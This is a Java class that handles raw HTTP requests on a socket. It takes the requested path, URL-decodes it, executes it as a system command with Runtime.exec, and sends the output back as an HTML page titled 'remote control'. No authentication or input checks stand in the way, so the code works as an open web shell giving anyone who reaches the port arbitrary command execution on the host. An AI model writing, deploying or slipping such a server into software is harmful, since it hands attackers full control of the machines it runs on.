import java.io.*;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;

public class Handle extends Thread{
    public Socket socket;
    public Handle(Socket socket){
        this.socket = socket;
        this.start();
    }
    @Override
    public void run() {
        try (OutputStream outputStream = socket.getOutputStream(); InputStream inputStream = socket.getInputStream()){
            String index = new Scanner(inputStream).nextLine().split(" ")[1].substring(1);
            //System.out.println(java.net.URLDecoder.decode(index,StandardCharsets.UTF_8.name()));
            try {
                Process p = Runtime.getRuntime().exec(java.net.URLDecoder.decode(index,StandardCharsets.UTF_8.name()));
                BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
                String line;
                String out = "<html><head>\n" +
                        "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n" +
                        "<title>Удаленное управление</title>\n" +
                        "</head><body>";
                while (true) {
                    line = r.readLine();
                    if (line == null) {
                        break;
                    }
                    System.out.println(line);
                    out = out + "<p>" + line + "</p>" + "\n";
                }
                out = out + "</body></html";
                outputStream.write((SetUp(out.length(), "text/html") + out).getBytes(StandardCharsets.UTF_8));
                outputStream.flush();
            }catch (IOException e){
                String out = "Fuck!" + e.getLocalizedMessage();
                outputStream.write((SetUp(out.length(), "text/html") + out).getBytes(StandardCharsets.UTF_8));
                outputStream.flush();
            }
        }catch (IOException e){

        }
    }
    public String SetUp(int length,String type){
        return "HTTP/1.1 200 OK\r\n" +
                "Server: MyWeb\r\n" +
                "Content-Type: " + type +"\r\n" +
                "Content-length: "+ length +" \r\n" +
                "Connection: close\r\n\r\n";
    }
}
